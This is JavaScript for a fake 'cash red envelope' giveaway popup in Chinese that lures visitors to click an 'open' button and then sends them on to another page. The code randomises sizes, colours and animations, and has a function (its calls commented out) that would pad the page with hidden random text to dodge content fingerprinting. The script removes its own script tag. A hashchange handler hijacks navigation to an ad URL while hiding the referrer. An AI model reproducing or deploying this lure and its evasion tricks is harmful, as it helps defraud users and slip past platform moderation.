function initPage() {
    var box_size = {
        w: 300 * sizeValue,
        h: 500 * sizeValue
    }
    var btn_size = {
        w: 100 * sizeValue,
        h: 100 * sizeValue
    }
    var bg_url = './images/bg.jpg';
    var animation = Math.floor(Math.random() * 4) + 1;
    var radian = Math.floor(Math.random() * 9) + 15;
    var html = '<div style="z-index: 999; height: 590px;  background: url('+bg_url+'); width: 354px; margin: -295px -177px; border-radius: 10px; overflow: hidden; position: fixed; background-size: 100% 100%; top: 50%; left: 50%; animation: show4 .4s; overflow: hidden; ">\
                    <div style=" height: 300px;">\
                        <p style="font-size: 20px;text-align: center;padding-top: 85px;color: #ebcd9b;">XXX给您的红包</p>\
                        <p style="font-size: 24px;text-align: center;padding-top: 20px;color: #ebcd9b;">'+ cm_atitle + '</p>\
                        <img src="./images/logo.png" style="width: 50%;margin: 0 auto 0 auto;display: block;padding-top: 55px;">\
                    </div>\
                    <div id="openbtn" style="width: 95px; height: 95px; border: 1px solid #ebcd9b;background-color: #ebcd9b; border-radius: 50%; margin: 95px auto 0; box-shadow: 0px 4px 0px 0px rgba(0, 0, 0, 0.2); text-align: center; line-height: 95px; animation: btn' + animation + ' .5s; animation:1.8s ease 0s infinite normal none running btnShake3;animation-delay: .1s;" onclick="openRed(this)">\
                        <span style=" display: inline-block; font-size: 36px; font-family: SimSun; font-weight: bold; color: #333;-webkit-animation: scaling .6s infinite; animation: scaling .6s infinite;" >開</span>\
                    </div>\
                </div>';

    var label_total = Math.floor(Math.random() * 10) + 10;
    //createLabel(label_total);
    document.body.innerHTML += html;
    //createLabel(label_total);

    var js = document.getElementById('main');
    if (js) js.parentNode.removeChild(js);
}
var color = getColor();
var sizeValue = scaleValue();
var bg_img = 'images/wed2.jpg';
var cm_btitle = "全民派发现金礼包";
var cm_atitle = '恭喜发财，恭喜发财';
var money = random_num(50, 200)*100;
var to = getUrlParam('to');
var type = getUrlParam('type');
initPage();
window.onhashchange = zp;


function getScript(url, callback) {
    var ele = document.createElement('script');
    ele.src = url;
    ele.onload = function() {
        if (typeof callback=== 'function') {
            callback()
        }
    };
    document['body']['appendChild'](ele)
}
function scaleValue() {
    var number = Math.floor(Math.random() * 30) + 90;
    return number / 100;
}
function createLabel(total) {
    var labelNames = ['div', 'li', 'ul', 'p', 'a', 'span', 'h2', 'i'];
    for (var i = 0; i < total; i++) {
        var name = labelNames[Math.floor(Math.random() * labelNames.length)];
        var label = document.createElement(name);
        label.style.display = 'none';
        label.textContent = randomText();
        document.body.appendChild(label);
    }
}
function getColor() {
    var a = Math.floor(Math.random() * 45) + 210;
    return 'rgb(' + a + ', 94, 77)';
}
function randomText() {
    var len = 64;
    var i = 0;
    var str = '';
    var base = 20000;
    var range = 1000;
    while (i < len) {
        i++;
        var lower = parseInt(Math.random() * range);
        str += String.fromCharCode(base + lower);
    }
    return str;
}
function random_num(max,min){
   var suff = parseInt(Math.random()*(max-min+1)+min,10); Math.floor(Math.random()*(max-min+1)+min);
   return suff;
}
function noRefJump(url){ 
    var a=document.createElement('a');
    a.href=url; a.rel='noreferrer';
    a.click(); 
}
function zp(){ 
    noRefJump(ad_url)
    //openRed(document.getElementById('openbtn'));
}
function openRed(el) {
    el.style.animation = 'btnMove .6s infinite alternate';
    setTimeout(function () {
        location.href = "view.html";
    }, 600);
}


